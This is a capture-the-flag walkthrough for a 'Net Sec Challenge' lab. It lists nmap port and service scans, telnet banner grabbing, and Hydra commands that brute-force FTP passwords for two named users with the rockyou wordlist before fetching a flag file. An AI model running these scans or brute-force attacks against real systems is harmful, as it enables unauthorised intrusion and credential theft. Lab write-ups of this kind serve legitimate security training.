# Net Sec Challenge

## Challenge Information
- **Challenge Name**: Net Sec Challenge
- **Category**: Network Exploitation
- **Difficulty Level**: Medium

## Analysis

1. `nmap 10.10.16.138`

2. `sudo nmap -sS -p 10000-20000 10.10.16.138`

3. Total ports found through the above commands

4. Use the following steps:
  - First use: `telnet 10.10.16.138 80`.
  - Then enter: `GET /index.html HTTP/1.1host: Telnet`
  - Then enter: `host: Telnet`
  - Then press enter key twice

5. `telnet 10.10.16.138 22`

6. `sudo nmap -sV -p 10021 10.10.16.138`

7. Use the following steps:
  - Brute force the passwords for both the mentioned users:
   ```
   hydra -l eddie -P /usr/share/wordlists/rockyou.txt -s 10021 10.10.16.138 ftp
   hydra -l quinn -P /usr/share/wordlists/rockyou.txt -s 10021 10.10.16.138 ftp
   ```
   - Try logging in with both the users using the found passwords: `telnet 10.10.16.138 10021`
   - Use `ls` command to see which user contains the flag file. The user **quinn** holds that file.
   - In the ftp terminal of **quinn**, use command `get ftp_flag.txt` to download the flag file.
   - `cat` the flag file in your own terminal where the file has been downloaded.
   
8. `sudo nmap -sN 10.10.14.15`
   
---
